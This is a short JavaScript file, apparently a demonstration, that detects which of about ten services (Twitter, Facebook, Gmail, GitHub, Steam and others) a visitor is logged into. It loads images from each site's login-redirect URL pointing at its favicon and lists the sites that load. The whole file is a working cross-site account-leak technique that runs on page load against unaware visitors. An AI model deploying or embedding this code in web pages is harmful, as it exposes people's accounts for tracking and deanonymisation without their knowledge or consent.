var leakSocialMediaAccounts = function (callback) {

    var platforms = [{
        domain: "https://twitter.com",
        redirect: "/login?redirect_after_login=%2f..%2ffavicon.ico",
        name: "Twitter"
    }, {
        domain: "https://www.facebook.com",
        redirect: "/login.php?next=https%3A%2F%2Fwww.facebook.com%2Ffavicon.ico%3F_rdr%3Dp",
        name: "Facebook"
    }, {
        domain: "https://accounts.google.com",
        redirect: "/ServiceLogin?passive=true&continue=https%3A%2F%2Fwww.google.com%2Ffavicon.ico&uilel=3&hl=en&service=mail",
        name: "Gmail"
    }, {
        domain: "https://accounts.google.com",
        redirect: "/ServiceLogin?passive=true&continue=https%3A%2F%2Fwww.youtube.com%2Ffavicon.ico&uilel=3&hl=en&service=youtube",
        name: "Youtube"
    },{
        domain: "https://login.skype.com",
        redirect: "/login?message=signin_continue&redirect_uri=https%3A%2F%2Fsecure.skype.com%2Ffavicon.ico",
        name: "Skype"
    }, {
        domain: "https://store.steampowered.com",
        redirect: "/login/?redir=favicon.ico",
        name: "Steam"
    },{
        domain: "https://accounts.google.com",
        redirect: "/ServiceLogin?service=blogger&hl=de&passive=1209600&continue=https://www.blogger.com/favicon.ico",
        name: "Blogger"
    }, {
        domain: "https://github.com",
        redirect: "/login?return_to=https%3A%2F%2Fgithub.com%2Ffavicon.ico%3Fid%3D1",
        name: "Github"
    }, {
        domain: "https://bitbucket.org",
        redirect: "/account/signin/?next=/favicon.ico",
        name: "BitBucket"
    }, {
        domain: "https://vk.com",
        redirect: "/login?u=2&to=ZmF2aWNvbi5pY28-",
        name: "VK"
    }];

    platforms.forEach(function (network) {
        var img = document.createElement('img');
        img.src = network.domain + network.redirect;
        img.onload = function () {
            callback(network, true);
        };
        img.onerror = function () {
            callback(network, false);
        };
    });
};

function displayResult(network, loggedIn) {
    var id = loggedIn ? 'loggedIn' : 'notLoggedIn';
    var favicon = faviconUri(network);
    var url = network.domain + network.redirect;
    var el = '<a target="_blank" href="' + url + '" target="_blank" class=network><img src=' + favicon + '><span>' + network.name + '</span></a>';
    if (loggedIn)      
        document.getElementById(id).innerHTML += el + " ";
        
        //console.log(id);
    
}
leakSocialMediaAccounts(displayResult);

function faviconUri(network) {

    var favicon = network.domain + '/favicon.ico';

    //DEBUG INFO
    //console.log(favicon);

    if (network.name === 'Dropbox') 
        favicon = 'https://www.dropbox.com/static/images/favicon.ico';
    
    if (network.name === 'Youtube') 
        favicon = 'https://www.youtube.com/favicon.ico';
    
    if (network.name === 'Gmail') 
        favicon = 'https://mail.google.com/favicon.ico';
    
    return favicon;
}
